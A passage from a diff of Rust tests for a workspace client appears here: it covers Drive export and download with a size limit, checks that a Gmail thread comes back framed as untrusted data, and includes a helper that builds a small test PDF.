+        ws.export_drive_file_text("tok", "doc_1", "text/plain")
+            .await
+            .unwrap(),
+        "Exported Google Doc text"
+    );
+    assert_eq!(
+        ws.download_drive_file_bytes("tok", "bin_small", 64)
+            .await
+            .unwrap(),
+        b"0123456789"
+    );
+    assert!(ws.download_drive_file_bytes("tok", "bin_huge", 32).await.is_err());
+
+    let framed_thread = ws.get_gmail_thread_text("tok", "thr_9").await.unwrap();
+    assert!(framed_thread.contains("<<<SOULS_UNTRUSTED_DATA:"));
+    assert!(framed_thread.contains("Thread reply body with invoice #42."));
+
+    server.abort();
+}
+
+fn build_test_pdf_bytes() -> Vec<u8> {
+    use lopdf::{dictionary, Document, Object, Stream};
+    let mut doc = Document::with_version("1.5");
+    let pages_id = doc.new_object_id();
+    let font_id = doc.add_object(dictionary! {
+        "Type" => "Font",
+        "Subtype" => "Type1",
+        "BaseFont" => "Helvetica",
+    });
+    let resources_id = doc.add_object(dictionary! {
+        "Font" => dictionary! { "F1" => font_id },
+    });
+    let content = b"BT /F1 12 Tf 100 700 Td (Architecture Benchmark Report) Tj ET\nBT 100 650 Td (Model    TPS    Latency) Tj ET\nBT 100 630 Td (Qwen3.5  46.6   241ms) Tj ET";
+    let content_id = doc.add_object(Stream::new(dictionary! {}, content.to_vec()));
+    let page_id = doc.add_object(dictionary! {
+        "Type" => "Page",
+        "Parent" => pages_id,
+        "Contents" => content_id,
+        "Resources" => resources_id,
+        "MediaBox" => vec![0.into(), 0.into(), 595.into(), 842.into()],
+    });
+    let pages = dictionary! {
+        "Type" => "Pages",
+        "Kids" => vec![page_id.into()],
+        "Count" => 1,
+    };
+    doc.objects.insert(pages_id, Object::Dictionary(pages));
+    let catalog_id = doc.add_object(dictionary! {
+        "Type" => "Catalog",
+        "Pages" => pages_id,
+    });
+    doc.trailer.set("Root", catalog_id);
+
+    let mut buffer = Vec::new();
+    doc.save_to(&mut buffer).unwrap();
+    buffer
 }
